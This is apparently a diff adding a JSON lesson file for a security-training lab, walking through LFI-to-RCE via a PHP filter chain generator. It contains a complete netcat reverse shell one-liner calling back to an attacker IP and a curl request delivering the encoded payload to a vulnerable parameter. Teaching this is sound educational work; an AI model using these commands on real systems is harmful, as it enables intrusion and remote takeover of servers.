@@ -1,0 +1,63 @@
+[
+    {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "P.S: Before continuing, make sure you understand <highlight>LFI</highlight>. You can find related learning resources in the <highlight>Course Material</highlight> section."    },
+    {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is a Filter Chain Generator?"
+    },
+    {
+        "type": "explanation",
+        "id": "lfi-tip",
+        "title": "Purpose of the Filter Chain Generator",
+        "items": [
+            "The Filter Chain Generator is used to encode a PHP script so that it does not execute immediately when sent to the target machine.",
+            "It uses PHP stream <highlight>wrapper</highlight> techniques internally.",
+            "For the <highlight>Filter Chain Generator</highlight> to work, ensure that <highlight>LFI</highlight> is working on the target machine."
+        ]
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "Let's look at the command used to execute the Filter Chain Generator."
+    },
+    {
+        "type": "code_block",
+        "id": "example-1",
+        "code": "python3 php_filter_chain_generator.py --chain '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f\"); ?>' | grep '^php' > payload.txt"
+    },
+    {
+        "type": "explanation",
+        "id": "lfi-tip-2",
+        "title": "Understanding the Command",
+        "items": [
+            "It uses the <highlight>php_filter_chain_generator.py</highlight> script.",
+            "<highlight>--chain</highlight> tells the tool to encode everything that comes after it.",
+            "The PHP code provided is a one-line reverse shell that opens a connection back to the attacker.",
+            "<highlight>grep '^php'</highlight> filters the output and keeps only the line that starts with <highlight>php</highlight>.",
+            "Finally, the clean encoded payload is saved into the <highlight>payload.txt</highlight> file."
+        ]
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-3",
+        "text": "After this, we will send the encoded string using LFI."
+    },
+    {
+        "type": "code_block",
+        "id": "example-2",
+        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=$(cat payload.txt)'"
+    },
+    {
+        "type": "explanation",
+        "id": "lfi-tip-3",
+        "title": "How This Works",
+        "items": [
+            "This request sends the encoded payload to the target machine through the vulnerable LFI parameter.",
+            "The <highlight>payload.txt</highlight> file contains a PHP filter chain, not just raw PHP code.",
+            "PHP will decode the chain step by step until the original PHP code is reconstructed and executed."
+        ]
+    }
+]
